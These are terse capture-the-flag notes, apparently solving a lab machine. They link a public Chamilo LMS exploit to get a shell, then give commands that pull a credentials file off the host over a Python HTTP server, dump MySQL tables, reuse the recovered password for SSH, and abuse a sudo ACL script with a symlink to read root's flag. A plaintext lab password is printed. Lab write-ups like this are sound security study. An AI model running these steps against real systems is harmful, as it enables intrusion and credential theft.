apache 2.4.52 doesn't seem vulnerable to anything obvious

port 8000 seems like a red herring, port knocking doesn't open it

noob mistake, adding the ip to dnsmasq and re-fuzzing the domains found something:
	www
	lms  
should've fuzzed the vhosts i guess

lms is hosting chamilo lms, which seems to be some layer on top of wordpress

quick search finds https://github.com/Ziad-Sakr/Chamilo-CVE-2023-4220-Exploit

we got a shell as www-data

another user in /home is mtz

netstat -tupln shows there's mysql on 3306

apparently chamilo saves db data in configuration.php 

find / -name configuration.php -> /var/www/chamilo/app/config/configuration.php

tar -czvf configuration.tgz /var/www/chamilo/app/config/configuration.php

python3 -m http.server -b 10.10.11.23 11111

after wgetting the archive we get this:
	$_configuration['db_password'] = '03F6lY3uXAP2bkW8'; 

see tables with mysql -u chamilo -p'03F6lY3uXAP2bkW8' -h localhost -P 3306 -e 'SHOW TABLES' chamilo

password from the user table is 1Ddsofn9mOaa9cbPzk0m6euWcainR.ZT2ts96vRCKrN7CGCmmq4ra, not crackable with rockyou.txt

db password works for the user ssh (wtf????)

we get user.txt at least

sudo -l says we can run /opt/acl.sh with sudo

this script can change user permissons for files in our home dir

we can link root.txt to our home dir, ln -s /root/root.txt ./

sudo /opt/acl.sh mtz r /home/mtz/root.txt

cat ./root.txt
